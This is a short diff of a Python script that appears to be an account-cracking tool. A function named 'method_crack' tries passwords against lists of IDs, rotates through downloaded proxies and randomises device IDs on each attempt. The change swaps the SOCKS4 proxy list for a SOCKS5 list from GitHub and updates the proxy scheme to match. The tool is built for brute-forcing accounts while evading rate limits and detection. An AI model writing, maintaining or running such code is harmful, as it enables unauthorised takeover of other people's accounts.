@@ -39,7 +39,7 @@ oks=[]
 cps=[]
 loop=0
 try:
-  proxylist= requests.get('https://raw.githubusercontent.com/Peaky-XD/proxy/main/socks4.txt').text
+  proxylist= requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
   open('socksku.txt','w').write(proxylist)
 except Exception as e:
   print(' server error')
@@ -150,7 +150,7 @@ def method_crack(ids,passlist):
             sys.stdout.write('\r\r \033[1;37mCracking.. %s|M1|\033[1;32mOK:%s'%(loop,len(oks)))
             sys.stdout.flush()
             nip=random.choice(proxsi)
-            proxs= {'http': 'socks4://'+nip}
+            proxs= {'http': 'socks5://'+nip}
             adid=str(uuid.uuid4())
             device_id=str(uuid.uuid4())
             bld=random.choice([178366431,676379710])
